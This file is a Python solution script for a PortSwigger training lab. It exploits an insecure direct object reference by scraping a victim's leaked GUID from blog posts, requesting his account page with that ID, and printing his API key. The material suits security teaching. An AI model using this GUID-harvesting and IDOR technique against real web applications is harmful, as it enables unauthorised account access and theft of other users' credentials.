# Lab 08 — User ID controlled by request parameter, with unpredictable user IDs
# PortSwigger: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-id
#
# Vulnerability: Same IDOR as Lab 07, but using GUIDs instead of usernames —
#                except the GUID is disclosed elsewhere in the app (blog posts)
# Aim:           Find carlos's GUID via the blog, then access his account
#
# Technique:
#   GUIDs can't be guessed, but they're not secret either. Browse blog posts
#   or comments for any reference to carlos that exposes his userId GUID,
#   then use that GUID in the same id= parameter from Lab 07.
#
# Usage: python access_control_lab08.py <url>

import sys
import re
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, check_status, extract_between, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GUID_PATTERN = re.compile(
    r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.IGNORECASE
)

if __name__ == "__main__":
    banner()
    section("LAB 08 — IDOR WITH UNPREDICTABLE USER IDs (GUID LEAK VIA BLOG)")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab08.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: browse blog posts looking for a userId GUID tied to carlos ──
    print("\n  ── Step 1: search blog posts for a userId GUID referencing carlos\n")

    carlos_guid = None
    for post_id in range(1, 15):
        r = session.get(f"{url}/post", params={"postId": post_id})
        if "carlos" not in r.text.lower():
            continue
        # Look for a userId= link near the carlos mention
        match = re.search(r'userId=([0-9a-f-]{36})', r.text, re.IGNORECASE)
        if match:
            carlos_guid = match.group(1)
            print(f"  ✔  Found carlos's GUID via postId={post_id}: {carlos_guid}")
            break

    if not carlos_guid:
        print("  ✘  Could not auto-discover carlos's GUID via blog posts.")
        print("     Browse /blogs manually and look for a userId= parameter")
        print("     on any post or comment authored by carlos.")
        sys.exit(1)

    # ── Step 2: use the GUID in the my-account id parameter ──────────────────
    print(f"\n  ── Step 2: access /my-account?id={carlos_guid}\n")
    r_carlos = session.get(f"{url}/my-account", params={"id": carlos_guid})
    check_status(r_carlos, 200, "carlos's account access via leaked GUID")

    # ── Step 3: extract the API key ───────────────────────────────────────────
    api_key = extract_between(r_carlos.text, "API Key: <span>", "</span>") or \
              extract_between(r_carlos.text, 'id="api-key">', "</")

    if api_key:
        print_box("LEAKED API KEY (carlos)", api_key)
    else:
        print_box("Raw response snippet", r_carlos.text[:500])

    print("  ℹ  Unpredictability stopped guessing, not leakage via another page.")
